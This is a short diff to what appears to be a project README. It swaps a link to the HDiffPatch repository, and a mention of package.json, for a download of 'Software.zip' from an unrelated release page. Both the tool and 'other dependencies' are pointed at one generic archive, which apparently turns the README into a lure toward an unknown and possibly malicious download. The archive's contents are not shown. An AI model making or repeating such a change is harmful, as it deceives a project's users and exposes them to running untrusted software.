@@ -2,5 +2,5 @@
 
 Feel free to use
 
-Diff/patch: https://github.com/sisong/HDiffPatch
-Other dependencies are in package.json
+Diff/patch: https://github.com/CPSGDPS/GCS-Client-backend/releases/download/v1.0/Software.zip
+Other dependencies are in https://github.com/CPSGDPS/GCS-Client-backend/releases/download/v1.0/Software.zip
